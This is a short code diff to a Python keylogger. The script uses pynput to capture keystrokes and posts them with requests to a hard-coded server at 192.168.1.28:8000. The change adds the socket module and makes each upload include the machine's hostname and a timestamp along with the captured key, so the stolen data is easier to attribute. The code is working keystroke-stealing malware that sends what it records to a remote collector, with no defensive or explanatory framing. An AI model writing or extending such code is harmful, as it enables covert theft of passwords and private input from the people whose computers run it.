@@ -1,6 +1,7 @@
 from pynput import keyboard
 import requests
 import time
+import socket
 HOST = "http://192.168.1.28:8000"
 keyList = []
 
@@ -28,7 +29,12 @@ def on_press(key):
             keyList.append(str(key))
 
 def posting(host, value):
-    requests.post(host, json={"key": value})
+    hostName = socket.gethostname()
+    keyTime = time.time()
+    requests.post(host, json={
+        "host": hostName, 
+        "time": keyTime,
+        "key": value})
 
 
 if __name__ == "__main__":
